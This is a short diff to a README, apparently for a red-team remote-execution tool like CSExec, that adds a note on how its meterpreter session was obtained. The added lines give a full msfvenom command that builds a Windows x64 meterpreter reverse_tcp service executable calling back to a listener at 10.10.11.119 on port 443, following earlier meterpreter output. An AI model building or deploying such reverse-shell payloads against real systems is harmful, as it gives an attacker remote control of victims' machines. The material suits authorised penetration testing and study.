@@ -45,4 +45,7 @@ meterpreter >
 
 ```
 
-I borrowed some enums from [this project](https://github.com/malcomvetter/CSExec/blob/master/csexec/Program.cs) which is similar, but takes a different approach.
+I borrowed some enums from [this project](https://github.com/malcomvetter/CSExec/blob/master/csexec/Program.cs) which is similar, but takes a different approach. As for the binary I used to get the meterpreter:
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.11.119 LPORT=443 -f exe-service -o ~/Dropbox/shell-svc.exe
+```
